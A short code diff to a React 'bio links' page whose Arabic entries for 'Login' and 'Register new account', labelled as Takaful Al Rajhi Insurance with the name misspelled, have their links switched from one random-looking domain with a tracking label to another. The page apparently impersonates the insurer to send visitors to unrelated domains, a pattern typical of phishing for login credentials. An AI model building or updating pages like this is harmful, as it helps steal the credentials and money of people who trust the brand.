@@ -6,13 +6,13 @@ export default function BioLinksPage() {
     {
       title: "تسجيل الدخول",
       description: "تكافل الراحجي للتامين",
-      href: "https://verdqa.net?label=d9fce3ed538c91ef707e8d3d2abdcb53",
+      href: "https://zazsd.net?label=aefb4aaec2082b3fa17bdd7c5941b561",
       icon: FileCheck,
     },
     {
       title: "تسجيل حساب جديد",
       description: "تكافل الراحجي للتامين",
-      href: "https://verdqa.net?label=d9fce3ed538c91ef707e8d3d2abdcb53",
+      href: "https://zazsd.net?label=aefb4aaec2082b3fa17bdd7c5941b561",
       icon: FileCheck,
     },
     {
